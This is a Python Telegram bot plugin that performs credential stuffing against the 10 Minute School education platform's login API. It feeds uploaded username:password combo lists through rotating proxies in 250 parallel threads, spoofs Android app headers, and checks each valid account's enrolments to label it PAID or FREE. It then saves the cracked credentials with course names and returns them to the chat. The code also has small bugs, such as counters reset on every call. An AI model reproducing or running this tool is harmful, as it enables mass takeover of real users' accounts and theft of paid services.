from random import choice
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import os
from tqdm import tqdm
from pyrogram import Client, filters
from pyrogram.types import Message

# Proxy and Combo file paths
COMBO_FILE = "combos.txt"
PROXY_FILE = "proxies.txt"
RESULT_FILE = "checked_combos.txt"

from random import choice
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from tqdm import tqdm


def read_proxies(proxy_file):
    try:
        with open(proxy_file, "r") as proxies:
            return [proxy.strip() for proxy in proxies]
    except FileNotFoundError:
        print("Please put proxies in the proxy.txt file.")
        return []


def extract_value(source, left, right):
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except (ValueError, AttributeError):
        return None


def read_file(file_path):
    """Read file and return list of lines."""
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f]
    except FileNotFoundError:
        return []


def random_proxy(proxies):
    proxy = choice(proxies)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}


def proxy_request(request_type, url, proxies, **kwargs):
    session = requests.session()
    while True:
        try:
            proxy = random_proxy(proxies)
            r = session.request(request_type, url, proxies=proxy, timeout=5, **kwargs)
            return r
        except requests.exceptions.RequestException:
            continue


def checker(combo: str, proxies):
    global PAID, BAD, FREE
    PAID = 0
    BAD = 0
    FREE = 0
    headers = {
        "x-user-device-name": "Xiaomi Redmi 8",
        "X-TENMS-DEVICE-ID": "be0e61763c50e4ab",
        "X-TENMS-SOURCE-PLATFORM": "android",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "api.10minuteschool.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.12.0",
    }

    try:
        username, password = combo.split(":")
        url = "https://api.10minuteschool.com/auth/v1/login"
        post_data = {
            "username": username,
            "password": password,
            "loginType": "email",
        }
        r = proxy_request("post", url, proxies, json=post_data, headers=headers)

        if "access_token" in r.text:
            status = extract_value(r.text, '"message":"', '"}')
            subscribed = extract_value(r.text, '"access_token":"', '",')
            headers["Authorization"] = f"Bearer {subscribed}"

            res = requests.get(
                url="https://api.10minuteschool.com/enrolment-service/api/v1/my-enrolments?limit=-1&with_expired=true",
                headers=headers,
            )

            if '"data":[]' in res.text:
                result = f"[FREE] {username}:{password}"
                FREE += 1
            else:
                course = extract_value(res.text, '"name":"', '",')
                write_file(username=username, password=password, account_type=course)
                result = f"[PAID] {username}:{password} | {course}"
                PAID += 1
        else:
            result = f"[BAD] {username}:{password}"
            BAD += 1
    except Exception as e:
        result = f"Error processing {combo}: {e}"

    return result


def write_file(username, password, account_type):
    with open(RESULT_FILE, "a") as data:
        data.write(f"{username}:{password} | COURSE={account_type}\n")


@Client.on_message(filters.command("10ms"))
async def check_combos(client: Client, message: Message):
    """Handle /check_combos command."""

    # Step 1: Ask for combo file
    combo_msg = await client.ask(
        message.chat.id, "📌 *Please send the combo file (TXT format).*", timeout=120
    )

    if not combo_msg.document:
        await message.reply_text("❌ You need to send a valid TXT file.")
        return

    combo_file_path = f"downloads/{combo_msg.document.file_name}"
    await client.download_media(combo_msg.document, file_name=combo_file_path)

    # Step 2: Ask for proxy file
    proxy_msg = await client.ask(
        message.chat.id, "📌 *Now send the proxy file (TXT format).*", timeout=120
    )

    if not proxy_msg.document:
        await message.reply_text("❌ You need to send a valid TXT file.")
        return

    proxy_file_path = f"downloads/{proxy_msg.document.file_name}"
    await client.download_media(proxy_msg.document, file_name=proxy_file_path)

    # Read files
    combos = read_file(combo_file_path)
    proxies = read_file(proxy_file_path)

    if not combos or not proxies:
        await message.reply_text("❌ Both combo and proxy files must contain data.")
        return

    status = await message.reply_text(
        "<i>Checking 10minuteschool combos... Please wait.</i>"
    )

    try:
        total_combos = len(combos)
        checked_combos = 0

        with ThreadPoolExecutor(max_workers=250) as executor:
            futures = {
                executor.submit(checker, combo, proxies): combo for combo in combos
            }
            with tqdm(total=total_combos, desc="Checking", unit="combo") as pbar:
                for future in as_completed(futures):
                    checked_combos += 1
                    pbar.update(1)

                    if checked_combos % 2 == 0:
                        await status.edit_text(
f"<b>10minuteschool Cracking...</b>\n"
f"<b>✅ Checked:</b> {checked_combos}/{total_combos}\n"
f"<b>PAID:</b> {PAID} | <b>FREE:</b> {FREE} | <b>BAD:</b> {BAD}\n"
                        )

        await status.edit_text(
f"<b>✅ Combo checking completed.</b>\n"
f"<b>Total Checked:</b> {total_combos}\n"
f"<b>PAID:</b> {PAID} | <b>FREE:</b> {FREE} | <b>BAD:</b> {BAD}"
        )

        if os.path.exists(RESULT_FILE):
            await client.send_document(message.chat.id, RESULT_FILE)
            os.remove(RESULT_FILE)
            os.remove(combo_file_path)
            os.remove(proxy_file_path)

    except Exception as e:
        await status.edit_text(f"❌ Error occurred: {e}")
